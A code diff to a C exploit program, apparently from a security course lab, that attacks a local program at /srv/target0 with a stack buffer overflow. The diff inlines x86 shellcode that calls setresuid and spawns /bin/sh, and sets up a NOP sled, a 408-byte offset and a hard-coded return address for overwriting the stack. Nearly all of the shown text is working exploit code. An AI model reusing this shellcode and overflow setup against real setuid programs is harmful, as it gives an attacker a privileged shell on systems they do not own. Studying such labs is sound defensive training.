@@ -3,13 +3,17 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include "shellcode.h"
 
 #define TARGET "/srv/target0"
 
+static char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
+                          "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
+                          "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
+                          "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
 const int OFFSET = 408;
 const int NOP_COUNT = 300;
-const int SHELLCODE_LENGTH = strlen(shellcode);
+const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;  // Subtract 1 to exclude the null terminator
 const int RETURN_ADDRESS_COUNT = (OFFSET - NOP_COUNT - SHELLCODE_LENGTH) / 4;
 const char* RETURN_ADDRESS = "\x90\xd3\xff\xff";  // 0xffffd390
 
@@ -35,7 +39,7 @@ int main(void)
         return_address_ptr += 4;
     }
 
-    // Null-terminate the exploit  string
+    // Null-terminate the exploit string
     buf[OFFSET] = '\0';
 
     // Set up the arguments for execve
